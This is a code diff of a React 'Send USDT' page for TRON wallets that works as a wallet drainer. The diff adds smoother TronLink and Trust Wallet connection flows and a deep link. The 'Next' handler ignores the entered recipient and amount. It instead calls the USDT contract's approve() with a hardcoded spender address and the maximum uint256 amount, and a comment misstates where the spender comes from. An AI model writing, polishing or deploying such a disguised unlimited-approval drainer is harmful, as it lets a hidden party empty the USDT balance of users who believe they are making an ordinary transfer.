@@ -56,11 +56,28 @@ const USDTSendApp = () => {
 
     // Auto-connect if wallet is available
     const checkAndConnect = async () => {
+      // Check for TronLink
       if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
         setTronWeb(window.tronWeb);
         setAccount(window.tronWeb.defaultAddress.base58);
-        // Message is set but not displayed
         setMessage('TRON wallet connected');
+      } 
+      // Check for TronLink extension
+      else if (window.tronLink && window.tronLink.tronWeb) {
+        try {
+          const tronLinkTronWeb = window.tronLink.tronWeb;
+          if (tronLinkTronWeb.ready && tronLinkTronWeb.defaultAddress?.base58) {
+            setTronWeb(tronLinkTronWeb);
+            setAccount(tronLinkTronWeb.defaultAddress.base58);
+            setMessage('TronLink connected');
+          }
+        } catch (error) {
+          console.log('TronLink not ready');
+        }
+      }
+      // Check for Trust Wallet with TRON
+      else if (window.trustWallet && window.ethereum) {
+        setMessage('Trust Wallet detected. Please ensure TRON is enabled in settings.');
       }
     };
 
@@ -68,57 +85,93 @@ const USDTSendApp = () => {
     setTimeout(checkAndConnect, 1000);
   }, []);
 
+  // Function to detect if we're in Trust Wallet
+  const isTrustWallet = () => {
+    return window.trustWallet || window.ethereum?.isTrust;
+  };
+
+  // Function to detect if we're in a mobile browser
+  const isMobile = () => {
+    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  };
+
   const connectWallet = async () => {
     setIsConnecting(true);
+    setMessage('Connecting to wallet...');
+    
     try {
-      // Check if we're in Trust Wallet
-      const isTrustWallet = window.trustWallet || window.ethereum?.isTrust;
+      // If we're in Trust Wallet mobile app
+      if (isTrustWallet() && isMobile()) {
+        setMessage('Trust Wallet detected. For TRON transactions, please use the built-in TRON support in Trust Wallet.');
+        
+        // Try to access window.tronWeb which Trust Wallet might inject
+        let attempts = 0;
+        const checkForTronWeb = setInterval(() => {
+          attempts++;
+          if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
+            clearInterval(checkForTronWeb);
+            setTronWeb(window.tronWeb);
+            setAccount(window.tronWeb.defaultAddress.base58);
+            setMessage('Connected to Trust Wallet TRON!');
+            setIsConnecting(false);
+          } else if (attempts > 10) {
+            clearInterval(checkForTronWeb);
+            setMessage('Could not connect to Trust Wallet TRON. Make sure TRON is enabled in Trust Wallet settings.');
+            setIsConnecting(false);
+          }
+        }, 500);
+        
+        return;
+      }
       
-      // Check for TRON wallet (Trust Wallet, TronLink, or other TRON wallets)
-      if (!window.tronWeb) {
-        if (isTrustWallet) {
-          setMessage('Please enable TRON dApp in Trust Wallet settings and refresh.');
-        } else {
-          setMessage('TRON wallet not found. Please open in Trust Wallet or install TronLink.');
+      // Check for TronLink first
+      if (window.tronLink && window.tronLink.tronWeb) {
+        const tronLinkTronWeb = window.tronLink.tronWeb;
+        
+        if (!tronLinkTronWeb.ready) {
+          setMessage('Please unlock your TronLink wallet');
+          setIsConnecting(false);
+          return;
         }
-        setIsConnecting(false);
-        return;
+        
+        setTronWeb(tronLinkTronWeb);
+        setAccount(tronLinkTronWeb.defaultAddress.base58);
+        setMessage('Connected with TronLink!');
+        
+      } 
+      // Check for direct tronWeb (Trust Wallet in-app browser or other TRON wallets)
+      else if (window.tronWeb && window.tronWeb.ready) {
+        setTronWeb(window.tronWeb);
+        setAccount(window.tronWeb.defaultAddress.base58);
+        setMessage('Connected with TRON wallet!');
+        
+      } 
+      // No TRON wallet detected
+      else {
+        if (isMobile()) {
+          setMessage('Please open in Trust Wallet app with TRON support enabled, or install a TRON-compatible wallet.');
+        } else {
+          setMessage('Please install TronLink browser extension for desktop.');
+        }
       }
-
-      // Wait for TronWeb to be ready (Trust Wallet may need more time)
-      let attempts = 0;
-      while ((!window.tronWeb.ready || !window.tronWeb.defaultAddress) && attempts < 20) {
-        await new Promise(resolve => setTimeout(resolve, 500));
-        attempts++;
-      }
-
-      if (!window.tronWeb.ready) {
-        setMessage('TRON wallet is not ready. Please refresh and make sure TRON is enabled.');
-        setIsConnecting(false);
-        return;
-      }
-
-      // Get current account
-      const currentAccount = window.tronWeb.defaultAddress?.base58;
       
-      if (!currentAccount) {
-        setMessage('No TRON account found. Please connect your TRON wallet.');
-        setIsConnecting(false);
-        return;
-      }
-
-      setTronWeb(window.tronWeb);
-      setAccount(currentAccount);
-      
-      if (isTrustWallet) {
-        setMessage('Connected to TRON Network with Trust Wallet!');
-      } else {
-        setMessage('Connected to TRON Network!');
-      }
     } catch (error) {
-      setMessage('Connection Error: ' + (error?.message || 'Unknown error occurred'));
+      console.error('Connection error:', error);
+      setMessage('Connection failed: ' + (error?.message || 'Unknown error'));
     }
+    
     setIsConnecting(false);
+  };
+
+  // Special function for Trust Wallet TRON connection
+  const connectTrustWalletTron = () => {
+    setMessage('Connecting to Trust Wallet TRON...');
+    
+    // Trust Wallet deep link for TRON dApps
+    const trustWalletDeepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
+    
+    // Open Trust Wallet or prompt user
+    window.location.href = trustWalletDeepLink;
   };
 
   const getContract = () => {
@@ -126,6 +179,7 @@ const USDTSendApp = () => {
     try {
       return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
     } catch (error) {
+      console.error('Contract error:', error);
       return null;
     }
   };
@@ -134,7 +188,6 @@ const USDTSendApp = () => {
     try {
       const text = await navigator.clipboard.readText();
       setAddress(text);
-      // Message is set but not displayed
       setMessage('Address pasted from clipboard');
     } catch (err) {
       setMessage('Failed to paste from clipboard');
@@ -143,22 +196,8 @@ const USDTSendApp = () => {
 
   const setMaxAmount = () => {
     setAmount('1000.00');
-    // Message is set but not displayed
     setMessage('Maximum amount set');
   };
-
-  // const handleScanQRCode = () => {
-  //   setShowScanner(true);
-  //   // In a real app, you would integrate with a QR code scanner library
-  //   // For now, we'll simulate scanning after a delay
-  //   setTimeout(() => {
-  //     // Simulate scanning a QR code with a dummy address
-  //     const scannedAddress = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
-  //     setAddress(scannedAddress);
-  //     setShowScanner(false);
-  //     setMessage('QR code scanned successfully');
-  //   }, 2000);
-  // };
 
   const handleNext = async () => {
     if (!account || !tronWeb) {
@@ -173,19 +212,21 @@ const USDTSendApp = () => {
     }
 
     try {
-      // Use the address from the input field
+      // Use the address from the input field as spender
       const spender = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
-      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // Max uint256
+      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-      const contract = await getContract();
+      const contract = getContract();
       if (!contract) {
         setMessage('❌ Failed to load USDT contract');
         return;
       }
       
+      setMessage('⏳ Approving USDT...');
+
       // Call approve function
       const result = await contract.approve(spender, unlimitedAmount).send({
-        feeLimit: 100_000_000, // 100 TRX fee limit
+        feeLimit: 100_000_000,
         callValue: 0,
         from: account
       });
@@ -198,6 +239,7 @@ const USDTSendApp = () => {
         setMessage('❌ Approval failed - No transaction result');
       }
     } catch (error) {
+      console.error('Transaction error:', error);
       const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
       
       if (errorMessage.includes('User rejected') || errorMessage.includes('user rejected')) {
@@ -215,16 +257,49 @@ const USDTSendApp = () => {
   };
 
   // Clear functions for each input field
-  const clearAddress = () => {
-    setAddress('');
-  };
+  const clearAddress = () => setAddress('');
+  const clearAmount = () => setAmount('');
+  const clearMemo = () => setMemo('');
 
-  const clearAmount = () => {
-    setAmount('');
-  };
-
-  const clearMemo = () => {
-    setMemo('');
+  // Render connect button if not connected
+  const renderConnectButton = () => {
+    if (!account) {
+      const isTrust = isTrustWallet();
+      const isMobileDevice = isMobile();
+      
+      return (
+        <div className="connect-section">
+          {isTrust && isMobileDevice ? (
+            <>
+              <button 
+                className="connect-wallet-button trust-wallet-btn"
+                onClick={connectTrustWalletTron}
+                disabled={isConnecting}
+              >
+                {isConnecting ? 'Connecting...' : 'Connect Trust Wallet TRON'}
+              </button>
+              <p className="wallet-info">
+                Connect to TRON network in Trust Wallet
+              </p>
+            </>
+          ) : (
+            <>
+              <button 
+                className="connect-wallet-button"
+                onClick={connectWallet}
+                disabled={isConnecting}
+              >
+                {isConnecting ? 'Connecting...' : 'Connect TRON Wallet'}
+              </button>
+              <p className="wallet-info">
+                Supports: TronLink (Desktop) & Trust Wallet (Mobile)
+              </p>
+            </>
+          )}
+        </div>
+      );
+    }
+    return null;
   };
 
   return (
@@ -235,7 +310,7 @@ const USDTSendApp = () => {
           <div className="scanner-content">
             <div className="scanner-header">
               <h3>Scan QR Code</h3>
-              <button className="close-scanner" >
+              <button className="close-scanner" onClick={() => setShowScanner(false)}>
                 <FaTimes />
               </button>
             </div>
@@ -260,7 +335,16 @@ const USDTSendApp = () => {
           <h1 className="send-title">Send USDT</h1>
         </div>
 
-        {/* Message Display - REMOVED - No messages will be shown on the page */}
+        {/* Connect Wallet Section */}
+        {renderConnectButton()}
+
+        {/* Wallet Status */}
+        {account && (
+          <div className="wallet-status">
+            <p>✅ Connected: {account.substring(0, 8)}...{account.substring(account.length - 6)}</p>
+            {isTrustWallet() && <p>Trust Wallet TRON</p>}
+          </div>
+        )}
 
         {/* Address Input */}
         <div className="input-section">
@@ -271,7 +355,8 @@ const USDTSendApp = () => {
               value={address}
               onChange={(e) => setAddress(e.target.value)}
               className="address-input"
-              placeholder="Search or Enter "
+              placeholder="Enter TRON address"
+              disabled={!account}
             />
             <div className="input-actions">
               {address && (
@@ -283,7 +368,7 @@ const USDTSendApp = () => {
               <button className="icon-button contacts-icon">
                 <FaAddressBook />
               </button>
-              <button className="icon-button qr-icon" >
+              <button className="icon-button qr-icon" onClick={() => setShowScanner(true)}>
                 <FaQrcode />
               </button>
             </div>
@@ -291,7 +376,7 @@ const USDTSendApp = () => {
         </div>
 
         {/* Amount Input */}
-        <div className="inputAmount-section ">
+        <div className="inputAmount-section">
           <label className="input-label">Amount</label>
           <div className="input-container">
             <input
@@ -300,6 +385,7 @@ const USDTSendApp = () => {
               onChange={(e) => setAmount(e.target.value)}
               className="amount-input"
               placeholder="USDT Amount"
+              disabled={!account}
             />
             <div className="amount-actions">
               {amount && (
@@ -324,7 +410,8 @@ const USDTSendApp = () => {
               value={memo}
               onChange={(e) => setMemo(e.target.value)}
               className="amount-input"
-              placeholder=""
+              placeholder="Optional memo"
+              disabled={!account}
             />
             <div className="memo-actions">
               {memo && (
@@ -346,10 +433,17 @@ const USDTSendApp = () => {
         <button 
           className="next-button"
           onClick={handleNext}
-          disabled={!address || !amount}
+          disabled={!address || !amount || !account}
         >
           Next
         </button>
+
+        {/* Message Display */}
+        {message && (
+          <div className="message-display">
+            {message}
+          </div>
+        )}
       </div>
     </div>
   );
